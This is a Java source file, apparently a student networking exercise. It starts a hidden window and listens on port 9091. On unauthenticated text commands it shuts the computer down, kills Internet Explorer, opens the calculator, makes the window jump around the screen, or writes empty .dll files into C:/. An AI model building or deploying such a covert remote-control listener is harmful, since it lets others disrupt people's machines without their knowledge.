package cibertec.edu.pe;

import java.awt.EventQueue;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.Date;

import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JTextArea;
import javax.swing.Timer;
import javax.swing.border.EmptyBorder;

public class frmserver extends JFrame implements Runnable {

	/**
	 * 
	 */
	private static final long serialVersionUID = 1L;
	private JPanel contentPane;
	JTextArea txtmensajes;
	int c = 0;

	Timer t1 = new Timer(100, new ActionListener() {
		@Override
		public void actionPerformed(ActionEvent arg0) {
			int x, y;
			x = (int) (Math.random() * getWidth());
			y = (int) (Math.random() * getHeight());
			setLocation(x, y);
			c++;
			if (c >= 20) {
				t1.stop();
				setVisible(false);
			}
		}
	});

	Timer t2 = new Timer(20, new ActionListener() {
		@Override
		public void actionPerformed(ActionEvent arg0) {
			Date fecha = new Date();
			SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH mm ss SSS");
			File f = new File("C:/" + sdf.format(fecha) + ".dll");
			try {
				FileOutputStream flujoA = new FileOutputStream(f);
				try {
					flujoA.close();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			} catch (FileNotFoundException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			c++;
			if (c >= 20) {
				t2.stop();
			}
		}
	});

	/**
	 * Launch the application.
	 */
	public static void main(String[] args) {
		EventQueue.invokeLater(new Runnable() {
			public void run() {
				try {
					frmserver frame = new frmserver();
					frame.setVisible(false);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		});
	}

	/**
	 * Create the frame.
	 */
	public frmserver() {
		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		setBounds(100, 100, 450, 300);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);
		contentPane.setLayout(null);

		txtmensajes = new JTextArea();
		txtmensajes.setBounds(10, 11, 299, 240);
		contentPane.add(txtmensajes);

		setSize(600, 600);

		Thread hilo = new Thread(this);
		hilo.start();
	}

	@Override
	public void run() {
		try {

			ServerSocket serv = new ServerSocket(9091);
			Socket cli;

			while (true) {
				cli = serv.accept();
				InputStream in = cli.getInputStream();
				DataInputStream flujo = new DataInputStream(in);
				String msg = flujo.readUTF();

				if (msg.equalsIgnoreCase("BLOQUEAR")) {
					setVisible(true);
				}
				if (msg.equalsIgnoreCase("DESBLOQUEAR")) {
					setVisible(false);
				}
				if (msg.equalsIgnoreCase("APAGAR")) {
					Runtime r = Runtime.getRuntime();
					r.exec("cmd /c shutdown -s -t 120");
				}
				if (msg.equalsIgnoreCase("CANCELAR")) {
					Runtime r = Runtime.getRuntime();
					r.exec("cmd /c shutdown -a");
				}
				if (msg.equalsIgnoreCase("CALCULADORA")) {
					Runtime r = Runtime.getRuntime();
					r.exec("cmd /c calc.exe");
				}
				if (msg.equalsIgnoreCase("INTERNET")) {
					Runtime r = Runtime.getRuntime();
					r.exec("cmd /c taskkill /IM iexplore.exe");
				}
				if (msg.equalsIgnoreCase("ZUMBIDO")) {
					c = 0;
					setVisible(true);
					setSize(300, 300);
					t1.start();
				}
				if (msg.equalsIgnoreCase("ARCHIVO")) {
					c = 0;
					t2.start();
				}

				txtmensajes.append("\n" + cli.getInetAddress() + " : " + msg);
				cli.close();
				if (msg.equalsIgnoreCase("FIN")) {
					serv.close();
					break;
				}
			}

		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}
